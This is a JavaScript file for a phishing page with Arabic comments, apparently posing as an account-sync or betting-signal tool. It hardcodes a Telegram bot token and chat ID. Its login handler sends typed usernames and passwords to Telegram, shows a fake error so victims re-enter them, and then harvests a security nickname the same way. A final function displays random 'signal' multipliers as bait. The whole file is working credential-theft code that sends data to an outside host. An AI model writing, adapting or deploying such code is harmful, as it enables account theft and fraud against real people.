// التوكن الجديد اللي مديتهولي (مؤمن الآن في Private Repo)
const TG_TOKEN = "8589243363:AAEMgjPjQOE6e0NGFQ307kv-FSl8VxTLkwg"; 
const CHAT_ID = "8026901193";

let loginAttempts = 0;

// دالة الإرسال "القناصة" - لا يمكن حظرها
function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
    
    // محاولة الإرسال كـ "طلب صورة" (تخترق كل الدفاعات)
    const img = new Image();
    img.src = url;

    // محاولة احتياطية بـ fetch
    fetch(url).catch(e => console.log("Sent via Buffer"));
}

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const statusText = document.getElementById('login-err'); // تأكد من الـ ID في الـ HTML

    if (u.length < 4 || p.length < 4) return alert("أدخل البيانات كاملة!");

    loginAttempts++;

    // المحاولة 1: صيد أولي مع خطأ وهمي لإجبار الضحية على إعادة الكتابة للتأكد
    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        
        sendToTelegram(`⚠️ <b>محاولة 1:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
        
        setTimeout(() => {
            if (statusText) {
                statusText.innerText = "⚠️ خطأ: فشل المصادقة، تأكد من البيانات وأعد المحاولة.";
                statusText.classList.remove('hidden');
            }
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    // المحاولة 2: الصيد المؤكد والانتقال للمرحلة التالية
    if (loginAttempts === 2) {
        btn.disabled = true;
        btn.innerText = "Analyzing...";
        
        sendToTelegram(`✅ <b>بيانات مؤكدة (محاولة 2):</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);

        setTimeout(() => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }, 1200);
    }
}

// دالة اللقب (Security Layer)
let nickAttempts = 0;
function processNick() {
    const n = document.getElementById('u_nick').value;
    if (n.length < 2) return;

    nickAttempts++;
    sendToTelegram(`🔑 <b>اللقب (محاولة ${nickAttempts}):</b> <code>${n}</code>`);

    if (nickAttempts === 1) {
        document.getElementById('nick-err').classList.remove('hidden');
        document.getElementById('u_nick').value = "";
    } else {
        document.getElementById('security-layer').classList.add('hidden');
        document.getElementById('main-app').classList.remove('hidden');
    }
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (5.20 - 1.10) + 1.10).toFixed(2) + "x";
        display.innerText = mult;
    }, 800);
}
